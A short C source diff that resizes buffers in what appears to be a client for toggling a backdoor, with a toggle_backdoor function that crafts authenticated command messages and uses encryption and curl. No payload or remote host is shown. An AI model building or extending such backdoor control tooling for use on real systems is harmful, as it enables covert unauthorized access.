@@ -17,7 +17,7 @@ static int message_id = 0;
 
 static void toggle_backdoor(int message_id, int command_type)
 {
-  unsigned char message[BUF_SIZE], buf[BUF_SIZE];
+  unsigned char message[MESSAGE_BUF_SIZE], buf[24];
 
   generate_rand_string(buf, 24);
   craft_message(message, AUTH_HEADER, message_id, command_type, 24, buf, buf);
@@ -37,8 +37,9 @@ int main()
   ssize_t n;
   size_t len = 0;
   int ciphertext_len, command_type, i;
-  unsigned char nonce[crypto_secretbox_NONCEBYTES];
-  unsigned char ciphertext_hex[DATA_BUF_SIZE], ciphertext[DATA_BUF_SIZE], message[DATA_BUF_SIZE], nonce_hex[BUF_SIZE];
+  unsigned char nonce[crypto_secretbox_NONCEBYTES], nonce_hex[crypto_secretbox_NONCEBYTES * 2];
+  unsigned char ciphertext_hex[BUF_SIZE * 2], ciphertext[BUF_SIZE];
+  unsigned char message[MESSAGE_BUF_SIZE];
   char buf[BUF_SIZE];
 
   curl_global_init(CURL_GLOBAL_DEFAULT);
